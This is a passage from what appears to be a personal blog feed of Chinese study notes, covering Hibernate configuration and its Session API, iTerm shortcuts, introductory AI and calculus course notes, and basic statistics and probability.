创建一个Hibernate的核心配置文件(指明连哪个数据库) Hibernate的核心配置文件的名称，一般用hibernate.cfg.xml projectname-&gt;src-&gt;new-&gt;hibernate.cfg.xml 约束位置复制： hibernate-core-5.0.7.Final.jar-&gt;org.hibernate-&gt; hibbernate-configuration-3.0.dtd &lt;!DOCTYPE hibernate-configuration PUBLIC &quot;-//Hibernate/Hibernate Configuration DTD 3.0//EN&quot; &quot;http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd&quot;&gt; &lt;hibernate-configuration&gt; &lt;session-factory&gt; &lt;!-- 查找位置：hiberante-release-5.0.7.Final/project/etc/hibernate.properties --&gt; &lt;!-- 连接数据库的基本参数 --&gt; &lt;property name=&quot;hibernate.connection.driver_class&quot;&gt;com.mysql.jdbc.Driver&lt;/property&gt; &lt;property name=&quot;hibernate.connection.url&quot;&gt;jdbc:mysql://localhost:3306/hibernate_day01&lt;/property&gt; &lt;property name=&quot;hibernate.connection.username&quot;&gt;root&lt;/property&gt; &lt;property name=&quot;hibernate.connection.password&quot;&gt;123&lt;/property&gt; &lt;!-- 配置Hibernate的方言,每种数据库的sql写法不一样需要用方言来指定 --&gt; &lt;property name=&quot;hibernate.dialect&quot;&gt;org.hibernate.dialect.MySQLDialect&lt;/property&gt; &lt;!-- 可选配置========= --&gt; &lt;!-- 打印SQL,默认是不打印的 --&gt; &lt;property name=&quot;hibernate.show_sql&quot;&gt;true&lt;/property&gt; &lt;!-- 格式化SQL --&gt; &lt;property name=&quot;hibernate.format_sql&quot;&gt;true&lt;/property&gt; &lt;!-- 自动创建表 --&gt; &lt;property name=&quot;hibernate.hbm2ddl.auto&quot;&gt;update&lt;/property&gt; &lt;!-- 配置C3P0连接池,引C3P0.jar --&gt; ... &lt;!-- 映射文件 --&gt; &lt;mapping resource=&quot;com/xxx/Customer.hbm.xml&quot; /&gt; &lt;/session-factory&gt; &lt;/hibernate-configuration&gt; 测试代码： //Hibernate入门案例 public class HibernateDemo1{ @Test //保存客户的案例 public void demo1(){ //1.加载Hibernate的核心配置文件 Configuration configuration = new Configuration().configure(); //如果将&lt;mapping&gt;这个标签注释掉，则 //可以手动加载映射 //configuration.addResource(&quot;com/xxx/Customer.hbm.xml&quot;); //2.创建一个SessionFactory对象：类似于JDBC中的连接池 SessionFactory seesionFactory = configuration.buildSessionFactory(); //3.通过SessionFactory获取到Session对象：类似于JDBC中的Connection Session session = sessionFactory.openSession(); //4.手动开启事务,后期交给Spring Transaction transaction = session.beginTransaction(); //5.编写代码 Customer customer = new Customer(); customer.setCust_name(&quot;xx&quot;); session.save(customer); //6.事务提交 transaction.commit(); //7.资源释放 session.close(); } } Hibernate的常见配置 1.XML提示的配置 !DOCTYPE里面的 &quot;http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd&quot; 在连网时可以有提示 //离线提示配置 Eclipse-&gt;window-&gt;preferences-&gt;XML Catalog-&gt;User Soecified Entries-&gt;Add -&gt;Key type: URI ; Key: &quot;http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd&quot; ; Location:需要下载这个dtd Hibernate的映射的配置 Customer.hbm.xml: &lt;class&gt; &lt;标签用来建立类与表的映射关系&gt; name 类的全路径 table 表名(类名与表名一致，table可以省略) catalog 数据库名 &lt;id&gt; &lt;标签用来建立类中的属性与表中的主键的对应关系&gt; name 类中的属性名 column 表中的字段名(类中的属性名和表中的字段名如果一致，column可以省略) length 长度 type 类型 &lt;property&gt; &lt;标签用来建立类中的普通属性与表的字段的对应关系&gt; name 类中的属性名 column 表中的字段名 length 长度 (可以自动建表的时候指定长度) type 类型(有3种写法 )(可以不用写) not-null 设置非空 true/false unique 设置唯一，默认为false Hibernate的核心的配置 第一种方式：属性文件方式 hibernate.properties hibernate.connection.driver_class=com.mysql.jdbc.Driver ... 属性文件的方式不能引入映射文件(需要手动编写代码去加载映射文件) 第二种方式：xml文件方式 hibernate.cfg.xml 必须的配置 连接数据库的基本的参数 驱动类 url路径 用户名 密码 方言 可选配置 显示SQL hibernate.show_sql 格式化SQL hibernate.format_sql 自动建表 hibernate.hbm2ddl.auto none 不使用hibernate的自动建表 create 如果数据库中已经有表，删除原有表，重新创建，如果没有表，新建表。(测试) create-drop 如果数据库中已经有表，删除原有表，执行操作，删除这个表。如果没有表，新建一个，使用完了删除该表(测试) update 如果数据库中有表，使用原有表，如果没有表，创建新表(更新表结构) validate 如果没有表，不会创建表，只会使用数据库中原有的表(校验映射和表结构是否一致) 映射文件的引入 引入映射文件的位置 mapping Hibernate 的核心API Configuration:Hibernate的配置对象 作用： 加载核心配置文件 Hibernate.properties Configuration cfg = new Configuration(); hibernate.cfg.xml Configuration cfg = new Configuration().configure(); 加载映射文件 SessionFactory:Session工厂 sessionFactory内部维护了Hiberante的连接池和二级缓存(不讲)(企业一般都用redis替换掉了)。是线程安全的对象。一个项目只需要创建一个即可 src-&gt;log4j.properties ### direct log messages to stdout ### # 输出源是控制台 log4j.appender.stdout=org.apache.log4j.ConsoleAppender log4j.appender.stdout.Target=System.err log4j.appender.stdout.layout=org.apache.log4j.PatternLayout log4j.appender.stdout.layout.ConversionPattern=%d{ABSOLUTE} %5p %c{1}:%L - %m%n ### direct log messages to file mylog.log ### # 输出源是文件 log4j.appender.file=org.apache.log4j.FileAppender log4j.appender.file.File=c\:mylog.log log4j.appender.file.layout=org.apache.log4j.PatternLayout log4j.appender.file.layout.ConversionPattern=%d{ABSOLUTE} %5p %c{1}:%L - %m%n ### set log levels - for more verbose logging change &apos;info&apos; to &apos;debug&apos; ### # error warn info debug trace(堆栈信息) log4j.rootLogger=info, stdout,file (输出级别，输出源) 配置连接池：(了解) 抽取工具类 com.xxx.hibernate.utils HibernateUtils.java (Hibernate工具类) public class Hiberanteutils{ public static final Configuration cfg; public static final SessionFactory sf; static{ cfg = new Configuration().configure(); sf = cfg.buildSessionFactory(); } public static Session openSession(){ return sf.openSession(); } } Session:类似Connection对象是连接对象 (非线程安全) 代表的是Hibernate与数据库的连接对象，与数据库交互桥梁 可以将其定义到内部里面 SessionAPI： 保存方法 Serializable save(Object obj) 查询方法 T get(Class c,Serializable id); (用的多一些) T load(Class c,Serializable id); /* * Customer customer = session.get(Customer.class,11); * //这里已经发送了SQL * sout(customer); * Customer customer = session.load(Customer.clas,21); * sout(customer); * //这里没有发送SQL */ get和load的区别，用debug去看: get： ·采用的是立即加载，执行到这行代码的时候，就会马上发送SQL语句去查询 ·查询后返回的是真实对象本身 ·查询一个找不到的对象的时候，返回null load： ·采用的是延迟加载（lazy懒加载），执行到这行代码的时候，不会发送SQL语句，当真正使用这个对象的时候才会发送SQL语句 ·查询后返回的是代理对象(利用的第三方的javassist-3.18.1-GA.jar来产生的代理对象) ·查询一个找不到的对象的时候，返回ObjectNotFoundException异常 修改方法 void update(Object obj); //直接创建对象，进行修改（不推荐） Customer customer = new Customer(); customer.setCust_id(11); session.update(customer); //先查询，再修改（推荐） Customer customer = session.get(Customer.class,11); customer.setCust_name(&quot;xxx&quot;); session.update(customer); 删除方法 void delete(Object obj); 保存或更新 void saveOrUpdate(Object obj) 查询所有 //接收HQL:Hibernate Query Language Query query = session.createQuery(&quot;from Customer&quot;); List&lt;Customer&gt; customer_list = query.list(); //接收SQL (复杂的时候才用) SQLQuery query = session.createSQLQuery(&quot;select * from cst_customer&quot;); List&lt;Object[]&gt; list = query.list(); Transaction:事务对象 commit() roolback() //note_day02 ORM：对象关系映射 持久化类的编写规则： 持久化：将内存中的一个对象持久化到数据库中过程。 持久化类：一个java对象与数据库的表建立了映射关系，那么这个类在Hiberante中称为是持久化类。 持久化类 = Java类 + 映射文件 对持久化类提供一个无参数的构造方法（因为Hibernate底层用了反射生成实例） 属性需要私有，对私有属性提供public的get和set方法（Hibernate中获取，设置对象的值） 对持久化类提供一个唯一标识OID与数据库主键对应（java中通过对象的地址区分是否是同一个对象，数据库中通过主键确定是否是同一个记录，在Hibernate中通过持久化类的OID的属性区分是否是同一个对象 持久化类中属性尽量使用包装类类型（因为基本数据类型默认是0，那么0就会有很多的歧义。包装类类型默认值是NULL） 持久化类不要使用final进行修饰（跟延迟加载有关系，延迟加载本身是hibernate一个优化手段，返回的是一个代理对象(javassist可以对没有实现接口的类产生代理--使用了非常底层字节码增强技术，继承这个类进行代理).如果不能被继承，则不能产生代理对象，延迟加载也就失效，load方法和get方法也就一致了) 主键生成策略 主键的分类: 自然主键 代理主键 //TODO day02 03 01:27 持久化类的三种状态 Hibernate的一级缓存 Hibernate的其他API]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>Java</category>
        <category>框架</category>
        <category>Hibernate</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>框架</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iTerm--快捷键效率篇01]]></title>
    <url>%2F2018%2F09%2F10%2FiTerm--%E5%BF%AB%E6%8D%B7%E9%94%AE%E6%95%88%E7%8E%87%E7%AF%8701%2F</url>
    <content type="text"><![CDATA[快捷键及效率工具 iTerm 1.高亮当前鼠标位置： ⌘+/ 当你切了屏幕，找不到当前位置时，也许能帮你省心。 2.切分屏幕：⌘+d 水平切分，⌘+Shift+d 垂直切分； 不多说，谁用谁知道。 3.智能查找，支持正则查找：⌘+f。 4.全屏显示tabs。 Items默认全屏时不显示tabs，这多少有点不方便。 5.切换 tab：⌘+←, ⌘+→, ⌘+{, ⌘+}。⌘+数字直接定位到该 tab； 谁用谁知道，tab随意切。 6.新建tab ⌘+t， 关闭tab ⌘+w 7.广播输入。shell-Boardcast Input 操作为数不多的主机时，可以使用。相当方便。]]></content>
      <categories>
        <category>时间整理</category>
        <category>效率</category>
        <category>Mac</category>
      </categories>
      <tags>
        <tag>效率</tag>
        <tag>Mac</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[人工智能学习笔记01]]></title>
    <url>%2F2018%2F09%2F10%2F%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001%2F</url>
    <content type="text"><![CDATA[1.复杂系统 1.1物理预测的胜利与失效 牛顿力学 预测模型 Complexity ruins predictability ):Randomness ):Chaos. 混沌。 三体。 精确小数点位数 ):Reflectivity ):Network Effect ):History Dependency 引论： Complex Theory that predicts when unpredictable happens 群体制约个体 Complex System In Common: Global structure rises from simple Evolved instand of being designed 2 大数据与机器学习 Data grows,but not our insight 3. 人工智能的三个阶段 3.1 规则阶段 3.2 机器学习阶段发展至连接主义阶段 符号，学派，控制 Classic Machine Learning 贝叶斯网络。 决策树. 3.4 连接主义阶段发展至学习阶段 神经网络没有唯一的答案 GPU 特征工程： 将混淆的数据分成可以机器学习能够线性切割的组的工程 r =. x^2 + y^2 𝛼 = y/x 3.3 三个阶段总结分析 Three Generation of AI Rule-based systems Classic machine learning Representation learning 3.6 应用 文本分类 图片抽取 音频 翻译 人工智能艺术家 无人机 医疗 课程大纲： 贝叶斯与随机过程 贝叶斯分析 随机过程理论 监督学习 KNN 线性回归 线性分类 神经网络 支持向量机 决策树 模型选择 扫描各种算法。 数学推导 -- 理解/ 参数 超参。 重点 程序 -- 安装 -- 介绍 深度学习 CNN 卷积网络 -- 对抗学习 RNN 循环网络 公式 稍微理解 理论工具 RRM等 python实践 重点 应用 -- 图像 -- 语言 复杂系统 统计力学（1.5天） 非线性动力学（1.5d） 应用 复杂系统反推机器学习 社会组织结构 计算神经科学 agent base model 应用于市场及分析里 4.高数 4.1 实数的定义（一） 高数 -&gt; 解决连续问题 线代 -&gt; 离散 +概率统计 什么是实数？ 整数 -&gt;有理数：Q P -&gt;实数： 有理数+无理数 戴的金分划：全集分成几个子集 实数的定义： 1.A中存在最大值，B中不存在最小值 2.A中不存在最大值，B中存在最小值 1.2叫做有理分划 3.A中不存在最大值，B中不存在最小值 无理分划 性质： 1）：稠密性 2）：有序性 4.4 实数元素个数 势，集合元素的个数。 等势：A，B集合间元素可一一对应。 希尔伯特旅馆： 可列/可数：（列成一排） 意思是可以像一一对应那样列成实线 4.6 自然数个数少于实数个数 反证法 实数的势&gt;正整数的势 4.8 无穷大之比较： ln n &lt; n ^ 1/a1 &lt; n &lt; n ^ a2 &lt; a3^n &lt; n! &lt; n ^ n n！～= √2𝛑n * (n/e)^n n ~= 10 要小于 1 / 10^6 4.10 级数的收敛 无穷小 无穷大的倒数顺序 发散。 收敛。 1 / n^a1 收敛(a&gt;1) 级数收敛的分界线 ....1/a^n &lt; 1 / n^a1 &lt; 1/n(ln n)^a 分界线 &lt; 1/n(ln n)&lt; 1/n &lt; 1/n^1/a &lt; 1/lna .... a = 1 发散 a &gt; 1 收敛 4.11 极限的定义 ℇ-∂语言 ℇ-N语言 lim(fx) = L x-&gt;x0 ℇ -- 任意目标变量 ∂ -- 自变量与目标变量的差值(????) |x-x0| &lt; ∂ 表示x 与 x0足够近 有|f(x) - L| &lt; ℇ lim Sn = L n-&gt;∞ ℇ,N n&gt; N时 有|Sn-L|&lt;ℇ 4.12 极限的四则运算 加法。。。 xxx.+ xxx = L1 + L2 4.13 极限的复合 若lim f(x) = L1 x-&gt;x0 lim g(x) = L2 x-&gt;L1 则 lim g(f(x)) = L2 x-&gt;x0 4.14 连续性 f(x)在x0处连续 lim f(x) = f(x0) x-&gt;x0 若左极限与右极限不相等，则f(x)在x0点不连续 5.复杂网络经济学 5.1 用网络的思维看经济结构 从复杂网络看产业森林 5.2 复杂网络认识前后 有个公式。 重要的参数是阈值。 阈值大的话两点间不易越迁，小的话预测不好 5.3 从网络结构看不同地区 预测模拟的时候：相似度越高越容易越迁 6 机器学习 6.1 什么是机器学习 大数据时代 大数据时代1.0:数据的积累和呈现 大数据时代2.0:机器学习：用历史数据预测未来 DT时代数据即财富 机器学习给数据赋予价值 -- 机器学习（偏技术） -- 神经网络。 ---深度学习 人工智能 -- 数据挖掘（偏应用，站在商业角度） -- 知识表示，推理，自然语言处理，感知。。 在试错中学习 6.2 机器学习的类型 监督学习：通过已有的训练样本（即已知数据以及其对应的输出）来训练，从而得到一个最优模型，再利用这个模型将所有新的 数据样本映射为相应的输出结果，对输出结果进行简单的判断从而实现分类的目的，那么这个最优模型也就具有了对未知数据进行分类的能力 无监督学习：我们事先没有任何训练数据样本，需要直接对数据进行建模 监督学习（反馈及时）VS强化学习（反馈不及时） 达到的是预测结果足够和真实结果接近 因素：叫做特征。（影响预测的关键因素） 泛化算法 reg（线性回归）： Y= w1a + w2b + w3c w: 权重 a,b,c：特征因素 6.3 简单回归 （接上） 监督学习： def estimate_house_sales_price(num_of_bedrooms,sqft,neightborhood): price = 0 if .... 怎么找权重： 用计算机找 第一步：把每个权重都设置为1 第二步：将每栋房产带入你的函数运算，检验估算值与正确价格的偏离程度。 例如：上表中第一套房产实际成交价为25万美元，你的函数估价为17.8万，相差了7.2万，这个时候要将你的数据集中的 每套房产估价偏离值平方后求和。假设一共有500套房，则其平方求和总计为xxx，除以500的到平均误差值。该平均误差值称为函数的代价。 **如果你能调整权重使得这个代价变为0，你的函数就完美了。 第三步：不断重复第二步，尝试所有可能的权重值组合。哪一个组合使得代价最接近于0，它就是你要使用的。 Cost = (求和(i1-i2))^2/500/2. 为什么会除以2呢？ 为了后面方便求导 怎么找到最优秀的权重值？ 将其(reg:cost)在空间上表示出来 先仅考虑2个特征的权重,x,y，然后z轴来表示cost值。 然后找z轴最低点 寻找遍历最短的途径。。。即开始点到z轴最低点的最短路线，即变为了求梯度问题 解决其他不相干因素造成的偏倚： 如果w1与w2有线性关系，则有时候会出现不唯一的结果。还易出现过拟合。解决方法：引入范数。 （新加入数据后，会采用随机梯度法） 过拟合：即把一份数据分成几个子数据，用子数据来进行预测的，则其不能用为另外的数据集上。 （经常见，原因即样本永远不是一个完整的样本） 1）引入假设可以有效减少过拟合。 2）分割成训练集和测试样本集（用测试样本来检验是否过拟合） 贝叶斯分析 7. 阿尔法狗和强化学习 7.1 人工智能的发展： min-max算法 围棋与象棋的区别 解决穷举法的办法：强化学习，让机器来举一反三。。 7.2 强化学习算法 环境元素 决策/行为 观测 反馈 行为者 以围棋为例： 马尔可夫决策树 Action State -&gt;Reword(奖励) 永远是从当下指向当下 策略与估值函数 要考虑所有时刻的奖励 要引入监督学习 马尔可夫决策树+DL https://github.com/RochesterNRT/RocAlphaGo/blob/develop/AlphaGo/mcts.py RL. : 强化学习 SL：监督学习 UL：无监督学习 正确+1分，错误-1分 启示： 1.目标明确 2.规则明确 3.信息完全 这样的游戏是机器学习可以玩的游戏 为什么炒股不能拿来当人工智能：炒股的规则，反伸性，信息不明确，对手还会伪装 生存策略： 提高效率 数据思维 专业知识 7.6 无监督学习 推荐算法 8 高数-两个重要的极限定理 8.1 回顾 IR。实数 取反方式从Q构建IR 8.2 （一） lim(1+1/n)^n = e n-&gt;∞ lim(sinx/x) = 1 x-&gt;0 证明方法：二项式展开，单调递增 夹逼定理：（三角函数，导数的证明相关） lim f(x) = L x-&gt;x0 lim g(x) = L x-&gt;x0 且在(x1,x2)内，x1&lt;x0&lt;x2 有f(x) &lt;= k(x) &lt;= g(x) =&gt; lim k(x) = L x-&gt;x0 9 高数-导数 9.1 定义 f`(x) = lim f(x)-f(x0) / x-x0 x-&gt;x0 特例： 处处连续且处处不可导 初等函数的导数： (x^n)` = n x^ n-1 (n != 0) (e^x)` = e^x sin`x = cos x ... 反函数的导数： 自变量因变量互换就是反函数 f` = lim ∆y/∆x g` = lim ∆x/∆y f`(x)g`(y) = 1 arcsin`x = 1/ (cos(arcsinx)) arctan`x = 1/ 1+x^2 ln`x = 1 / x 所有初等函数： sinx ,cosx,tanx,arcsinx,arccosx,arctanx,x^n,e^x,ln x 复合函数的导数： g`(f(x)) = g`(f) * f`(x) k = e^ ln k 9.6 泰勒展开 f(x) = f(x0) + f`(x0)(x-x0)/1! + f&apos;&apos;(x0)(x-x0)^2 / 2! + ... 在x0处会得出展开范围内的任意值 典型项： f(n) (x0)(x-x0)^n / n! f(n) ---- f的n次导 9.7 罗尔定理 (为了证明洛比塔法则) y = f(x) 在闭区间【a,b】内可导，且f(a) = f(b) 则一定存在c， c属于（a,b) f&apos;(c) = 0 9.8 微分中值定理和柯西中值定理 微分中值定理 f(x)在[a,b]可导，那么一定存在c f&apos;(c) = f(b) - f(a) / b-a 柯西中值定理 f(x),g(x)在[a,b]可导，且g(x) != 0 则一定存在c。 f(b)-f(a) / g(b)-g(a) = f&apos;(c)/g&apos;(c) 9.9 洛比塔法则 lim f(x) = 0 , lim g(x) = 0 x-&gt;a x-&gt;a 有 lim f(x)/g(x) = lim f&apos;(a)/g&apos;(a) x-&gt;a x-&gt;a 10. 贝叶斯理论 10.1 梯度优化 数据通常用.csv保存，可以用excel打开，也可以用python打开 jupyter 机器学习都需要通过代价函数转化为优化问题 解决的最简单的方法：遍历 图上各个点即构成了代价函数 Gradient（梯度） G = [cos(t)]&apos; / x&apos; 一维的话是指变化的速率 二维的话（即x,y,z)，导数分偏x导数，与偏y导数 ，，寻找在哪个方向是最快的（reg：下降的方向（reg：加负号）） 步幅（步伐）。与 梯度的模长成正比。 在距离目标较远时，步伐较大，越接近时，步伐较小 10.3 概率基础 监督学习：有标准答案的试错学习 无监督学习：根据一定的假设寻找数据内部的结构 强化学习：延迟满足，根据结果调整行为 衡量模式的方法-概率论 Probability is common sense reduced to calculation. 机器学习问题随机性的来源： 问题内在的不确定性 信息不完全 模型所能考虑的特征有限 模型本身永远脱离真实 概率与事件： 1.试验 2.事件 3.概率空间 4.概率运算 4.1 A∪B 4.2 A∩B 4.3 ！A = 1 - P(A) 4.4 P(A | B) P(B|A) = P(A,B) / P(A) P(B|A) 独立 = P(B) P(A) = P(A | B)P(B) + P(A|!B)P(!B) 10.5 贝叶斯推理 P(A,B) = P(A|B)P(B) P(B,A) = P(B|A)P(A) -&gt; P(A|B) = P(B|A)P(A) / P(B|A)P(A)+P(B|!A)P(!A) 贝叶斯公式 P(A) --- 先验概率 P(A|B) -- 后验概率 B -- 证据 A -- 事件 证据 -- 数据 **根据数据更新对事件可能性的估计 贝叶斯代表的是主观概率 10.8 辛普森案件]]></content>
      <categories>
        <category>技能</category>
        <category>数学</category>
        <category>算法/分析</category>
        <category>人工智能</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>人工智能</tag>
        <tag>python</tag>
        <tag>分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[统计学学习笔记01]]></title>
    <url>%2F2018%2F09%2F10%2F%E7%BB%9F%E8%AE%A1%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B001%2F</url>
    <content type="text"><![CDATA[03 统计学 //note 01 如果有一个很大的极端值，则均值考虑会很不科学 极差：简单地描述数据的范围大小，表示离散程度 方差： 标准差：有效地避免了因单位平方而引起的度量问题，与方差一样，标准差的值越大，表示数据越分散 直方图 频数分布表 频数直方图 频率直方图（常用） 纵坐标：频率/组距 组距就是分组的极差 箱线图 四分位数:Q1，将所有数据按照从小到大的顺序排序排在第25%位置的数字 上四分位数:Q3，将所有数据按照从小到大的顺序排序排在第75%位置的数字 四分位距:IQR，等于Q3-Q1，衡量数据离散程度的一个统计量 异常点:小于Q1-1.5IQR或大于Q3+1.5IQR的值 上边缘:除异常点以外的数据中的最大值 下边缘:除异常点以外的数据中的最小值 箱线图简单画法: reg：8 23 7 4 9 6 9 4 3 1. 排序:2 3 3 4 4 6 7 8 9 9 2. 找出中位数:(4+6)/2=5 3. 分别找出前半部分不后半部分的中位数——下四分位数不上四分位数:3与8 4. 判断异常点:3-1.5*(8-3)=-4.5;8+1.5*(8-3)=15.5;没有异常点 5. 找出最大值不最小值:2不9 6. 在3到8之间画一个箱子，分别用箭头指向2,9 异常点用空心圆标出 茎叶图 茎叶图可以在保留全部数据信息的情况下，直观地显示出数据的分布情况 简单画法: 53 53 59 61 61 63 65 67 67 69 69 69 70 70 71 74 75 75 76 77 78 79 80 81 81 81 81 82 84 85 86 87 87 87 88 89 90 91 91 94 95 1. 将数据分为茎和叶两部分，这里的茎是指十位上的数字，叶是指个位上的数字 2. 将茎部分(十位)从小到大，从上到下写出来 3. 相对于各自的茎，将同一茎(十位)的叶子(个位)从小到大，从左往右写出来 线图 以时间为横坐标，变量为纵坐标，反映变量随时间推移的变化趋势 柱形图 柱形图:显示一段时间内的数据变化或显示各项之间的比较情况（可以比较组内情况） 柱形图与直方图比较： 从横坐标看，直方图是同一个变量的分组划分，而柱形图则是不同的组别 从作用上看，直方图用于显示一组数据的分布情况，而柱形图则是用于比较不同组别的数据差异 饼图 //note 02 总体方差 样本方差 （除数为n-1） 分位数 四分位数的选择具有争议性 分位数的数学定义： 选择四分位的百分比值y，及样本总量n，分位数的位置可以由下面的公式计算： Ly = n * (y/100) 情况1:如果L是一个整数，则取第L和第L+1的平均值 情况2:如果L不是一个整数，则取下一个最近的整数（比如1.25，则取2） 随机试验 3个特点： 1. 可以在相同的条件下重复进行 2. 试验的可能结果不止一个，但在试验前可以知道所有可能结果 3. 试验前不能确定哪个结果会出现 样本空间，样本点 对于随机试验E，E的所有可能结果组成的集合称为E的样本空间，记为S。其中，S中的 元素，即E的每个可能结果，称为样本点。 S={范围} 事件 随机事件 基本事件 由一个样本点组成的单点集 事件发生 必然事件 不可能事件 事件关系 包含，和，积，差，互斥，逆 事件运算定律 交换律 A ∩ B = B ∩ A；A ∪ B = B ∪ A 结合律 A ∪ (B ∪ C) = (A ∪ B) ∪ C;A ∩ (B ∩ C) = (A ∩ B) ∩ C 分配律 A ∪ (B ∩ C) = (A ∪ B) ∩ (A ∪ C) A ∩ (B ∪ C) = (A ∩ B) ∪ (A ∩ C) 德摩根律： 频数 频率 概率：（需要满足的条件） 1.非负性：P(A) &gt;= 0 2.规范性: 对于必然事件S，有P(S)=1 3.可列可加性 性质： 1.P(∅)=0 不可能事件发生的概率为0 2.有限可加性 3.对于A，B两个事件，若A⊃B,则P(A-B)=P(A)-P(B);P(A)&gt;=P(B) 4.对于任一事件A，有P(A)&lt;=1 5.对于任一事件A，有P(A(逆))=1-P(A) 6.对于A，B两个事件，有P(A ∪ B)=P(A)+P(B)-P(AB)(称为加法公式) Buffon投针实验 𝛑的估算 古典概型 1. 试验的样本空间只包含有限个元素 2. 试验中每个基本事件发生的可能性相同，即每个基本事件发生的概率相等 则称这样的试验E为古典概型，也叫等可能概型 例如：抛硬币，抛骰子等 排列组合 A3 9(从上往下,3,9) = 9*8*7 C3 9 = 9*8*7 / 3*2*1 实际推断原理： 概率很小的事件在一次试验中实际上几乎是不发生的 几何概型 1. 试验的样本空间包含无限个元素 2. 试验中每个基本事件发生的可能性相同，即每个基本事件发生的概率相等 P(A)=构成事件A的区域长度(面积或体积)/实验的全部结果所构成的区域长度(面积或体积) //note 03 条件概率 已知某个事件A发生的条件下，另一个事件B发生的概率称为条件概率，记为P(B|A) P(B|A)=P(AB)/P(A) 乘法定理 P(AB)=P(B|A)P(A),其中P(A)&gt;0 -&gt;P(ABC)=P(C|AB)P(B|A)P(A)=P(A|BC)P(B|C)P(C) 全概率公式 P(A)=P(A|B1)P(B1)+P(A|B2)P(B2)+...+P(A|Bn)P(Bn) B1...Bn 是样本空间S的划分 划分 贝叶斯公式： 设试验E的样本空间为S。A为E的一个事件，B1，b2.....Bn是S的一个划分，且P(A)&gt;0,P(Bi)&gt;0(i=1,2,....,n),则 P(Bi|A)=P(ABi)/P(A)=P(A|Bi)P(Bi)/(j=1 n累加)P(A|B1)P(B1)+P(A|B2)P(B2)+...P(A|Bj)P(Bj) 贝叶斯公式的应用——--垃圾邮件判别 原理:若已知某些字词经常出现在垃圾邮件中，却很少出现在合法邮件中，当一封邮 件含有这些字词时，那么他是垃圾邮件的可能性就很大。 (1)创建基于字词符号的贝叶斯数据库——--垃圾邮件不非垃圾邮件 (2)创建贝叶斯概率库——--垃圾概率 (3)创建个性化的贝叶斯库——--根据个人需求更改先验概率 公式比较 乘法公式、全概率公式与贝叶斯公式 1 乘法公式是求“几个事件同时发生”的概率; 2 全概率公式是求“最后结果”的概率; 3 贝叶斯公式是已知“最后结果” ，求“某个事件”的概率. 先验概率与后验概率 1 P(Bj|A)是在事件A发生的条件下, 某个事件Bj发生的概率, 称为 “后验概率”; 2 Bayes公式又称为“后验概率公式”或“逆概公式”; 3 称P(Bj) 为“先验概率”. 独立性 设A，B是两个事件，如果满足：P(AB)=P(A)P(B),则称事件A，B相互独立。简称A，B独立。 -- A(逆)与B(逆)也相互独立 多事件相互独立 多个事件相互独立!=多个事件两两独立 相互独立事件与互斥事件，对立事件 互斥事件与对立事件都不是相互独立事件 //note04 随机变量----Random Variable 定义：设随机试验的样本空间为S={e},X=X(e)是定义在样本空间S上的实值单值函数，称X=X(e)为随机变量 离散(Discrete)型随机变量 连续(Continuous)型随机变量 取值概率 对于离散型随机变量，随机变量的每一个取值都一定的概率 分布律 (0-1)分布/两点分布 伯努利试验 n重伯努利试验：将一个伯努利试验独立地重复n次的一串重复的独立试验 二项分布 泊松分布 (p&lt;=0.1时，可以直接用它来代替二项分布)(n&gt;=20,p&lt;=0.05) 概率密度分布图 分布函数 对于连续型随机变量，由于其可能的取值不能一一列出，所以就不能像离散型随机变量那样使用分布律去描述它。这时我们需要更加通用的描述方式--分布函数 设X是一个随机变量，x是任意实数，函数F(x)=P(X&lt;=x)称为X的分布函数(累积分布函数)(英文简写CDF) 性质： 1.F(x)是一个不减函数 2.0&lt;=F(x)&lt;=1,且F(-∞)=lim x-&gt;∞F(x)=0; F(∞)=lim x-&gt;∞ F(x) = 1 3.F(x)是右连续的 连续型随机变量的分布函数 连续型随机变量 严格定义: 对于随机变量X的分布函数F(x)，存在非负可积函数f(x)，使对于任意实数x有 F(x)= ∫x -∞ f(t)dt 则称X为连续型随机变量，f(x)称为X的概率密度凼数 ( Probability Density Function )，简称概率密度(PDF) 概率密度 性质： 1.f(x) &gt;=0 2.∫∞ -∞ f(x)dx = F(∞) = 1 3.对于任意实数X1,X2(X1&lt;=X2),P{X1&lt;=X&lt;=x2}=F(x2)-F(x1)=∫x2 x1 f(x)dx 4.若f(x)在点x处连续，则有F&apos;(x)=f(x) 均匀分布 若连续函数X具有概率密度f(x)={1/(b-a),a&lt;x&lt;b ; 0,其他，则称X在区间(a,b)上服从均匀分布，记为X~U(a,b) 正态分布 若连续型随机变量X的概率密度为f(x)=1/(√(2𝝿𝛔)e)^(-(x-𝛍)^2/2𝛔^2),-∞&lt;x&lt;∞，则称X服从参数为𝛍,𝛔^2的正态分布，记为X～N(𝛍,𝛔^2) 性质： 1.曲线关于x=u对称 2.当x=u时，概率密度函数可以取得最大值f(x)=1/(√(2𝝿𝛔)) 3.在具有同样长度的区间中，当区间离u越远，X落在区间的概率越小 (𝛔^2越大越窄，u负数左移) 标准正态分布 u=0,𝛔^2=1时，为标准正态分布 标准正态分布查表 正态分布-&gt;标准正态分布 二项分布与正态分布 二项分布是离散情况下的正态分布 当n足够大时，可以用正态分布近似二项分布，从而避免二项分布中繁杂的计算 若X～B(n,p)，当n足够大时，有X近似服从正态分布N(np,np(1-p)) 导数 求导公式 不定积分 简单定积分 牛顿——莱布尼兹公式: ∫b a f(x)dx=F(x)|b a = F(b)-F(a) 其中，F(x)为f(x)的原函数，即𝐹′(𝑥) = 𝑓(𝑥) 分部积分公法: 设u(x)、v(x)在[a,b]上具有连续导数u&apos;(x),v&apos;(x)，则 ∫b a u(x)dv(x) = u(x)v(x)|b a - ∫b a v(x)du(x) 二维随机变量(或向量) 一般，设E是一个随机试验，它的样本空间是S={e}，设X=X{e}和Y={e}是定义在S上的 随机变量，由X与Y构成的向量(X,Y)叫做二维随机向量或是二维随机变量(Two- dimensional random 